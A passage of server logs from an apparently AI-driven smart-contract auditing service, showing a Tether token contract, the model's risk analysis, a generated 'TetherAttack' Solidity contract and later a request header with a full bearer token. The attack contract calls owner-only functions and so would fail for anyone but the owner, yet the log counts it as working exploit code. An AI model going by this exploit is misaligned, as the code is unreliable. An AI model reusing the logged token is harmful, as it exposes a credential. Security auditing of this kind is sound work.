basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe main contract with business logic and user funds is **TetherToken**, an ERC20 token contract with additional features:  \n- Pausable functionality (can pause/unpause transfers by owner)  \n- BlackList functionality (owner can blacklist addresses, preventing them from transferring tokens)  \n- Upgradeability (can deprecate itself and forward calls to an upgraded contract)  \n- Fee mechanism (basisPointsRate and maximumFee, though currently zero)  \n- Minting (issue) and burning (redeem) tokens by the owner  \n- Ability for owner to destroy tokens held by blacklisted addresses  \n\nThe contract inherits from:  \n- Ownable (owner control)  \n- StandardToken (ERC20 implementation with allowance)  \n- BlackList (blacklisting and destroying blacklisted funds)  \n- Pausable (emergency stop)  \n\nThe contract holds no ETH but manages token balances representing user funds.\n\n2. Vulnerability Assessment:  \n\n**a) Centralization and Privilege Risks**  \n- The owner has extensive powers:  \n  - Can pause/unpause all token transfers.  \n  - Can add/remove addresses from blacklist arbitrarily.  \n  - Can destroy all tokens of any blacklisted address (effectively confiscate tokens).  \n  - Can mint (issue) unlimited new tokens to self.  \n  - Can redeem (burn) tokens from own balance.  \n  - Can deprecate the contract and redirect calls to an upgraded contract.  \n- These powers create a centralization risk and potential for abuse or theft by the owner.\n\n**b) Blacklist and Destroy Black Funds**  \n- The `destroyBlackFunds` function allows the owner to zero out the balance of any blacklisted user and reduce total supply accordingly.  \n- This is a backdoor to confiscate tokens from any user if blacklisted.  \n- No user consent or appeal mechanism exists.\n\n**c) Upgradeability Risks**  \n- The `deprecate` function allows the owner to mark the contract as deprecated and set an upgraded contract address.  \n- After deprecation, all ERC20 functions forward to the upgraded contract.  \n- If the upgraded contract is malicious or buggy, users lose control over their tokens.  \n- No multisig or timelock on upgrade, so owner can upgrade instantly.\n\n**d) Fee Parameters**  \n- The owner can set fee parameters (`basisPointsRate` and `maximumFee`) with limits (`basisPointsRate < 20`, `maximumFee < 50 * 10^decimals`).  \n- Although fees are currently zero, the owner can enable fees up to 0.2% and max 50 tokens per transfer, which can be used to drain user balances over time.\n\n**e) ERC20 Approve Race Condition**  \n- The `approve` function implements the known ERC20 race condition mitigation by requiring allowance to be zero before setting a new non-zero allowance.  \n- This is standard but still requires careful use by users.\n\n**f) No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic.  \n- No payable functions or ETH transfers.  \n- No external calls in state-changing functions that could cause reentrancy.\n\n3. Exploitation Requirements:  \n\n- To exploit the blacklist and destroy funds, attacker must be the owner or compromise the owner key.  \n- To exploit upgradeability, attacker must be the owner to set a malicious upgraded contract.  \n- To exploit fee mechanism, attacker must be the owner to set fees and drain user balances gradually.  \n- No direct user-exploitable bugs or reentrancy vulnerabilities found.  \n- The main risk is centralized control by the owner, which can be abused if the owner is malicious or compromised.\n\n---\n\n**Summary:**  \n- Solidity version: `pragma solidity ^0.4.17;`  \n- The TetherToken contract is a centralized ERC20 token with owner-controlled blacklist, minting, burning, pausing, and upgradeability.  \n- The owner has powerful backdoors to confiscate tokens, pause transfers, mint unlimited tokens, and upgrade to arbitrary contracts.  \n- No direct technical vulnerabilities like reentrancy or math bugs were found.  \n- The main security concern is the high level of trust and control vested in the owner, which can lead to economic exploits or censorship.', 'reasoning': 'The main contract with business logic and user funds is **TetherToken**, an ERC20 token contract with additional features:  \n- Pausable functionality (can pause/unpause transfers by owner)  \n- BlackList functionality (owner can blacklist addresses, preventing them from transferring tokens)  \n- Upgradeability (can deprecate itself and forward calls to an upgraded contract)  \n- Fee mechanism (basisPointsRate and maximumFee, though currently zero)  \n- Minting (issue) and burning (redeem) tokens by the owner  \n- Ability for owner to destroy tokens held by blacklisted addresses  \n\nThe contract inherits from:  \n- Ownable (owner control)  \n- StandardToken (ERC20 implementation with allowance)  \n- BlackList (blacklisting and destroying blacklisted funds)  \n- Pausable (emergency stop)  \n\nThe contract holds no ETH but manages token balances representing user funds.\n\n2.', 'summary': '**a) Centralization and Privilege Risks**  \n- The owner has extensive powers:  \n  - Can pause/unpause all token transfers.  \n  - Can add/remove addresses from blacklist arbitrarily.  \n  - Can destroy all tokens of any blacklisted address (effectively confiscate tokens).  \n  - Can mint (issue) unlimited new tokens to self.  \n  - Can redeem (burn) tokens from own balance.  \n  - Can deprecate the contract and redirect calls to an upgraded contract.  \n- These powers create a centralization risk and potential for abuse or theft by the owner.\n\n**b) Blacklist and Destroy Black Funds**  \n- The `destroyBlackFunds` function allows the owner to zero out the balance of any blacklisted user and reduce total supply accordingly.  \n- This is a backdoor to confiscate tokens from any user if blacklisted.  \n- No user consent or appeal mechanism exists.\n\n**c) Upgradeability Risks**  \n- The `deprecate` function allows the owner to mark the contract as deprecated and set an upgraded contract address.  \n- After deprecation, all ERC20 functions forward to the upgraded contract.  \n- If the upgraded contract is malicious or buggy, users lose control over their tokens.  \n- No multisig or timelock on upgrade, so owner can upgrade instantly.\n\n**d) Fee Parameters**  \n- The owner can set fee parameters (`basisPointsRate` and `maximumFee`) with limits (`basisPointsRate < 20`, `maximumFee < 50 * 10^decimals`).  \n- Although fees are currently zero, the owner can enable fees up to 0.2% and max 50 tokens per transfer, which can be used to drain user balances over time.\n\n**e) ERC20 Approve Race Condition**  \n- The `approve` function implements the known ERC20 race condition mitigation by requiring allowance to be zero before setting a new non-zero allowance.  \n- This is standard but still requires careful use by users.\n\n**f) No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic.  \n- No payable functions or ETH transfers.  \n- No external calls in state-changing functions that could cause reentrancy.\n\n3.', 'code': "pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function addBlackList(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function deprecate(address _upgradedAddress) external;\n    function setParams(uint newBasisPoints, uint newMaxFee) external;\n    function issue(uint amount) external;\n    function transfer(address to, uint value) external returns (bool);\n}\n\ncontract TetherAttack {\n    ITetherToken public target;\n    address public owner;\n\n    function TetherAttack(address _target) public {\n        target = ITetherToken(_target);\n        owner = msg.sender;\n    }\n\n    function attack(address victim, address upgradedContract) public {\n        require(msg.sender == owner);\n\n        // Blacklist victim\n        target.addBlackList(victim);\n\n        // Destroy victim's tokens\n        target.destroyBlackFunds(victim);\n\n        // Mint new tokens to self\n        target.issue(1000000 ether);\n\n        // Set fees to drain users (0.2% max fee 50 tokens)\n        target.setParams(20, 50 ether);\n\n        // Deprecate to malicious upgraded contract\n        target.deprecate(upgradedContract);\n    }\n}", 'code_type': 'solidity', 'duration': 28.37655735015869}
2025-06-23 14:43:05,739 - app.services.contract_service - INFO - Has exploit code: True
2025-06-23 14:43:05,741 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-06-23 14:43:05,742 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-06-23 14:43:05,744 - app.services.contract_service - INFO - Attack strategy summary: **a) Centralization and Privilege Risks**  
- The owner has extensive powers:  
  - Can pause/unpause all token transfers.  
  - Can add/remove addresses from blacklist arbitrarily.  
  - Can destroy all tokens of any blacklisted address (effectively confiscate tokens).  
  - Can mint (issue) unlimited new tokens to self.  
  - Can redeem (burn) tokens from own balance.  
  - Can deprecate the contract and redirect calls to an upgraded contract.  
- These powers create a centralization risk and potential for abuse or theft by the owner.

**b) Blacklist and Destroy Black Funds**  
- The `destroyBlackFunds` function allows the owner to zero out the balance of any blacklisted user and reduce total supply accordingly.  
- This is a backdoor to confiscate tokens from any user if blacklisted.  
- No user consent or appeal mechanism exists.

**c) Upgradeability Risks**  
- The `deprecate` function allows the owner to mark the contract as deprecated and set an upgraded contract address.  
- After deprecation, all ERC20 functions forward to the upgraded contract.  
- If the upgraded contract is malicious or buggy, users lose control over their tokens.  
- No multisig or timelock on upgrade, so owner can upgrade instantly.

**d) Fee Parameters**  
- The owner can set fee parameters (`basisPointsRate` and `maximumFee`) with limits (`basisPointsRate < 20`, `maximumFee < 50 * 10^decimals`).  
- Although fees are currently zero, the owner can enable fees up to 0.2% and max 50 tokens per transfer, which can be used to drain user balances over time.

**e) ERC20 Approve Race Condition**  
- The `approve` function implements the known ERC20 race condition mitigation by requiring allowance to be zero before setting a new non-zero allowance.  
- This is standard but still requires careful use by users.

**f) No Reentrancy or Math Vulnerabilities**  
- Uses SafeMath for all arithmetic.  
- No payable functions or ETH transfers.  
- No external calls in state-changing functions that could cause reentrancy.

3.
2025-06-23 14:43:05,745 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-06-23 14:43:05,746 - app.services.contract_service - INFO - Temporary file /tmp/tmp0jyceoup.sol removed
2025-06-23 14:43:05,759 - app.api.contract - INFO - Report saved with filename: Ownable_2025-06-23_14-43, status: KO
2025-06-23 14:43:05,760 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-23 14:43:05,762 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:43:05,764 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:43:05,765 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:43:05,767 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 14:43:05,768 - werkzeug - INFO - 172.31.0.1 - - [23/Jun/2025 14:43:05] "POST /analyze HTTP/1.1" 200 -
2025-06-23 14:48:14,743 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 14:48:14,914 - app.app - INFO - Application started
2025-06-23 14:48:14,925 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.0.5:8000
2025-06-23 14:48:14,928 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 14:53:36,312 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 14:53:36,482 - app.app - INFO - Application started
2025-06-23 14:53:36,494 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.96.5:8000
2025-06-23 14:53:36,495 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 14:53:46,082 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:53:46,088 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:53:46,095 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:53:46,100 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 14:53:46,105 - werkzeug - INFO - 192.168.96.1 - - [23/Jun/2025 14:53:46] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 14:53:46,126 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 14:53:46,129 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2OTMzMDl9.oYQi8b1V_3p2mMgK4Yfy79bTpz1qaRnsHOn2OGgI62c', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 14:53:46,131 - app.api.auth - INFO - Request content type: application/json
2025-06-23 14:53:46,133 - app.api.auth - INFO - Processing JSON request
2025-06-23 14:53:46,136 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 14:53:46,607 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 14:53:46,612 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:53:46,617 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:53:46,620 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:53:46,623 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 14:53:46,625 - werkzeug - INFO - 192.168.96.1 - - [23/Jun/2025 14:53:46] "POST /login HTTP/1.1" 200 -
